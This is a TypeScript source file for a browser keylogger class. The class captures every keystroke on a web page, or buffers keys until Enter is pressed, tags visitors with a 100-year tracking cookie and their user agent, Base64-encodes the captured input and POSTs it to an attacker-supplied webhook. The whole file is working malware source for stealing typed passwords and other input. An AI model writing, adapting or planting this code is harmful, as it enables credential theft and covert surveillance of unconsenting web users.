import type { IPayload, ISession } from "./Keylogger.types";

/**
 * Keylogger class to capture keyboard events and send them to a specified webhook.
 */
export default class Keylogger {
    /** Webhook URL to send captured data. */
    protected webhook:      string;
    /** Current session information. */
    protected session:      ISession | null = null;
    /** Array to store captured keystrokes. */
    protected keys:         Array<string> = [];

    /**
     * Constructs a new instance of the Keylogger.
     *
     * @param { string } webhook - URL of the webhook to send captured data.
     * @param { boolean } [logAll=false] - Whether to log every keypress (`true`) or only on the "Enter" key (`false`).
     */
    constructor(webhook: string, logAll: boolean | undefined) {
        this.webhook = webhook;
        const masterSession: string = this.getOrCreateMasterSession();
        this.initializeSession(masterSession);
        logAll ? this.logAll() : this.logOnEnter();
    }

    /**
     * Retrieves or creates a persistent "master-kw-cookie" cookie.
     * @returns The value of the "master-kw-session" cookie.
     */
    protected getOrCreateMasterSession(): string {
        const cookieName: string = "master-kw-session";
        const existingCookie: string | undefined = document.cookie
            .split("; ")
            .find((row) => row.startsWith(`${cookieName}=`));
        if (existingCookie) {
            return existingCookie.split("=")[1];
        }
        const newMasterSession: string = crypto.randomUUID();
        const expires: Date = new Date();
        expires.setFullYear(expires.getFullYear() + 100); 
        document.cookie = `${cookieName}=${newMasterSession}; expires=${expires.toUTCString()}; path=/`;
        return newMasterSession;
    }

    /**
     * Initializes the session with metadata.
     * @param { string } session_cookie - The persistent session cookie value.
     */
    protected async initializeSession(session_cookie: string): Promise<void> {
        this.session = await this.createSession(session_cookie);
    }

    /**
     * Creates a new session object with metadata.
     * @param { string } session_cookie - The persistent session cookie value.
     * @returns { Promise<ISession> } A Promise resolving to the session object.
     */
    protected async createSession(session_cookie: string): Promise<ISession> {
        const id: string = crypto.randomUUID();
        const created_at: Date = new Date();
        const user_agent: string = navigator.userAgent;
        return { id, created_at, user_agent, session_cookie };
    }

    /**
     * Sends captured data to the webhook along with the session information.
     * NOTE: Data is encoded in Base64 to prevent interception.
     *
     * @param payload - The data payload to send.
     */
    protected async sendToWebhook(payload: IPayload): Promise<void> {
        if (!this.session) return;
        const body: string = btoa(JSON.stringify({ ...payload, session: this.session }));
        try {
            const response: Response = await fetch(this.webhook, {
                method: "POST",
                headers: {
                    "Content-Type": "text/plain",
                },
                body
            });
            if (!response.ok) {
                console.error(btoa(response.statusText));
            }
        } catch (e: unknown) {
            console.error(btoa((<Error>e).toString()));
        }
    }

    /**
     * Logs all keypress events and sends each key to the webhook.
     */
    protected logAll(): void {
        document.addEventListener("keydown", (event: KeyboardEvent) => {
            const key: string = event.key;
            this.keys.push(key);
            this.sendToWebhook({
                type: "keypress",
                value: key,
            });
        });
    }

    /**
     * Logs all keystrokes until the "Enter" key is pressed, then sends the accumulated keys to the webhook.
     */
    protected logOnEnter(): void {
        document.addEventListener("keydown", (event: KeyboardEvent) => {
            if (event.key === "Enter") {
                const value: string = this.keys.join("");
                this.keys = []; 
                this.sendToWebhook({
                    type: "enter",
                    value,
                });
            } else {
                this.keys.push(event.key);
            }
        });
    }
}

